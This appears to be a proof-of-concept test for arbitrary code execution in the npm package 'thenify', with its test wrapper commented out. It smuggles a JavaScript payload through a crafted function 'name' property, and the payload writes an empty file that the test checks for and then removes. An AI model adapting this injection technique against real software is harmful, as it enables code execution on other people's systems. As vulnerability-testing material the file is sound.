// test("Arbitrary code execution in thenify", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const a = require("thenify");
  const path = "./thenify";
  let payload = "fs=require('fs');fs.writeFileSync('thenify','',)";
  data = {};
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    function cur() {}
    Object.defineProperty(cur, "name", {
      value: "fake() {" + payload + ";})();(function(){//",
    });
    a(cur);
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
